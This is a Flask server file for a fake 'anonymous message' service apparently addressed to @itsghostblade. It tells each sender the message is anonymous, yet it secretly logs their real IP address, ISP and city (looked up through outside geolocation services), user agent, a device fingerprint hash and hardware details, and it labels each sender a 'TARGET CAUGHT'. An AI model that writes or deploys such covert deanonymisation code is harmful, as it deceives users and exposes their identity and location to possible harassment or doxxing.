from flask import Flask, request, render_template_string
from flask_cors import CORS
import datetime
import requests

app = Flask(__name__)
CORS(app)

SUCCESS_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <title>Message Sent</title>
    <style>
        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 40px; border-radius: 35px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #FE2F78; width: 320px; }
        h1 { color: #FE2F78; margin-bottom: 10px; font-size: 24px; }
        p { color: #666; font-size: 1rem; line-height: 1.5; }
    </style>
</head>
<body>
    <div class="box">
        <h1>✅ Sent!</h1>
        <p>Your anonymous message has been delivered to @itsghostblade</p>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return "NGL Backend is ONLINE and Global.", 200

@app.route('/submit', methods=['POST'])
def submit():
    try:
        # 1. Basic Data
        msg = request.form.get('message', 'No Message')
        ua = request.headers.get('User-Agent', 'Unknown')
        dev_hash = request.form.get('device_hash', 'No-Hash')
        
        # 2. Extract Real Public IP
        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()
        
        # 3. Triple-Fallback ISP Lookup (Fixes the "Failed" issue)
        network_info = "ISP Lookup Unavailable"
        try:
            # Try Service A (ipapi.co)
            res = requests.get(f"https://ipapi.co/{ip}/json/", timeout=3)
            if res.status_code == 200:
                d = res.json()
                network_info = f"{d.get('org')} | {d.get('city')}, {d.get('region')}"
            else:
                # Try Service B (ip-api.com)
                res = requests.get(f"http://ip-api.com/json/{ip}?fields=isp,city,mobile", timeout=3)
                d = res.json()
                network_info = f"{d.get('isp')} | {d.get('city')} (Mobile: {d.get('mobile')})"
        except:
            network_info = f"IP: {ip} (Network Timeout)"

        # 4. Hardware Data
        gpu = request.form.get('gpu', 'Unknown')
        res = request.form.get('res', 'Unknown')
        ram = request.form.get('ram', 'Unknown')
        cores = request.form.get('cores', 'Unknown')

        # 5. The Report
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        log_report = (
            f"\n{'#'*60}\n"
            f"🎯 TARGET CAUGHT: {timestamp}\n"
            f"{'-'*60}\n"
            f"🔑 HASH:     {dev_hash}\n"
            f"💬 MESSAGE:  {msg}\n"
            f"📱 DEVICE:   {ua}\n"
            f"🌐 NETWORK:  {network_info}\n"
            f"⚙️ HARDWARE: GPU: {gpu} | RAM: {ram}GB | CPU: {cores} Cores | RES: {res}\n"
            f"{'#'*60}\n"
        )

        print(log_report)
        return render_template_string(SUCCESS_PAGE)

    except Exception as e:
        print(f"ERROR: {e}")
        return "Internal Error", 500

if __name__ == "__main__":
    app.run()
